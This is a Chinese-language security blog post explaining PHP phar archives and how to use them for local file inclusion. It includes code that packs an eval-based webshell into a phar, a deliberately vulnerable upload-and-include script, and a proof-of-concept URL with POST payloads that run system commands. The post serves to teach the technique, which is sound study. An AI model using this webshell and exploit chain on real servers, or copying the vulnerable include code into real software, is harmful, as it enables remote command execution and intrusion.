---
title: php phar LFI
author: 简文涛
categories:
  - Web
tags:
  - 文件包含
comments: true
img: 'https://i.loli.net/2019/07/23/5d36d66a071f727349.png'
abbrlink: 60905
date: 2019-07-22 20:57:30
---
## 0x01. 什么是phar

如果你之前开发过Java程序，我相信你肯定知道Jar文件(Jar是Java ARchive的缩写)。一个应用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单。

PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。文件归档到一个文件包。将一个模块的文件打包成一个phar，这样方便模块整体迁移，只需将phar文件移动过去，其他环境中include即可使用。如果你使用的是 PHP 5.3 或更高版本，那么Phar后缀文件是默认开启支持的，你不需要任何其他的安装就可以使用它。

## 0x02. 创建phar文件

phar.readonly = Off 这个参数必须设置为Off，如果为On，表示phar文档不可写。
在cli和Apache的`php.ini`中进行修改
**makephar.php**
```php
<?php
 
try{
    $p = new Phar("my.phar", 0, 'my.phar');
} catch (UnexpectedValueException $e) {
    die('Could not open my.phar');
} catch (BadMethodCallException $e) {
    echo 'technically, this cannot happen';
}
 
$p->startBuffering();
$p['file1.txt'] = 'file1';
$p['file2.txt'] = 'file2';
$p['file3.txt'] = 'file3';
$p['shell.php'] = '<?php phpinfo(); eval($_POST[x]); ?>';
 
// use my.phar
echo file_get_contents('phar://my.phar/file2.txt');  // echo file2
 
// make a file named my.phar
$p->setStub("<?php
    Phar::mapPhar('myphar.phar'); 
__HALT_COMPILER();");
 
$p->stopBuffering();
 
?>
```
上面代码生成一个my.phar文件，代码输出file2字符串。

my.phar文件包含了file1.txt，file2.txt，file3.txt和shell.php这四个文件。当然了，这四个文件不是真实存在磁盘上。

注意：这几个文件不能直接通过http访问，但可以被include和file_get_contents等php函数利用。

## 0x03. 利用phar

在makephar.php文件的当前目录，新建一个callphar.php，利用phar特定的格式。
```php
<?php
include 'phar://my.phar/shell.php';
?>
```

访问callphar.php即可调用shell.php

注意：phar文件不受文件名限制，即my.char可以任意的重命名为aaa.bbb

**callphar.php**
```php
<?php
include 'phar://aaa.bbb/shell.php';
?>
```

## 0x04. LFI漏洞代码及利用

**upload.php**
```php
<?php
 
if(isset($_POST['submit'])){
    $upload_name = $_FILES['file']['name'];
    $tempfile = $_FILES['file']['tmp_name'];
    $upload_ext = trim(get_extension($upload_name));
 
    $savefile = RandomString() . '.txt';
    if ($upload_ext == 'txt') {
            if(move_uploaded_file($tempfile,$savefile)) {
                die('Success upload. FileName: '.$savefile);
            }
            else {
                die('Upload failed..');
            }
    }
    else {
        die('You are not a txt file..');
    }
 
}
function get_extension($file){
    return strtolower(substr($file, strrpos($file, '.')+1));   
}
 
function RandomString()
{
    $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $randstring = "";
    for ($i = 0; $i < 16; $i++) {
        $randstring .= $characters[rand(0, strlen($characters)-1)];
    }
    return $randstring;
}
 
// make a lfi vulnerability
$file = $_REQUEST['file'];
if ($file != '') {
    $inc = sprintf("%s.php", $file); // only php file can be included
    include($inc);
}
?>
 
 
<html>
    <body>
        <form method="post" action="#" enctype="multipart/form-data">
            <input type="file" name="file" value=""/>
            <input type="submit" name="submit" value="upload"/>
        </form>
    </body>
</html>
```
上面代码只能上传txt文件，并且可以include php后缀名的文件。

**利用**：
将makephar.php生成的my.char重命名为phar.txt，并且上传。
![](https://i.loli.net/2019/07/22/5d35c41253eeb13566.png)
POC：
`http://localhost/upload.php?file=phar://7xg2dLIIJLfnTnQE.txt/shell`
![](https://i.loli.net/2019/07/22/5d35c433691f165025.png)
然后再利用传上去的`phar.txt`中的`<?php phpinfo(); eval($_POST[x]); ?>`POST传参`x=system("whoami");
就可以任意命令执行

![](https://i.loli.net/2019/07/22/5d35c4b02672386609.png)

查看源码
![](https://i.loli.net/2019/07/22/5d35c4e11984c66817.png)
POST传参`x=system("ls-lha");
![](https://i.loli.net/2019/07/22/5d35c5c4484ab94758.png)
查看源码
![](https://i.loli.net/2019/07/22/5d35c505ccba888539.png)

参考：[php phar LFI](http://www.91ri.org/13363.html)
